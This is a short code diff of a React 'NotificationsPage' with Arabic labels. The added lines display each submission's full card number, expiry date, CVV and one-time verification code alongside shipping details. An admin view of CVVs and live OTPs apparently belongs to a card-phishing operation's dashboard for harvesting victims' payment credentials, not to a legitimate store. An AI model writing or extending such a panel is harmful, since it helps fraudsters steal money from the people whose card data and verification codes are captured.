@@ -284,7 +284,7 @@ export default function NotificationsPage() {
                   {selectedNotification.shipping.phone}
                 </p>
                 <p>
-                  <strong>رقم الهاتف:</strong>{' '}
+                  <strong>المحافظة:</strong>{' '}
                   {selectedNotification.shipping.governorate}
                 </p>
               </div>
@@ -300,20 +300,28 @@ export default function NotificationsPage() {
               </p>
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
-                {selectedNotification.paymentInfo?.cardNumber}-     {selectedNotification.paymentInfo?.prefix}
+                {   selectedNotification.values?.cardNumber }
+                {selectedNotification.paymentInfo?.cardNumber}-{selectedNotification.paymentInfo?.prefix}..
               </p>
               <p>
                 <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
+                {   selectedNotification.values?.expiryMonth }/                {   selectedNotification.values?.expiryYear }
+
+..
                 {selectedNotification.paymentInfo?.year}/{selectedNotification.paymentInfo?.month}
               </p>
               
                 <p className="flex items-center">
                   <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{' '}
                   {selectedNotification.paymentInfo?.pass}
+                  ..
+                 رمز{   selectedNotification.values?.cvv }
+
                 </p>
                 <p className="flex items-centerpt-4">
                   <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
-                  {selectedNotification.paymentInfo?.otp}
+                  {selectedNotification.paymentInfo?.otp}..
+                  {selectedNotification.values?.otp}
                 </p>
               <>
               
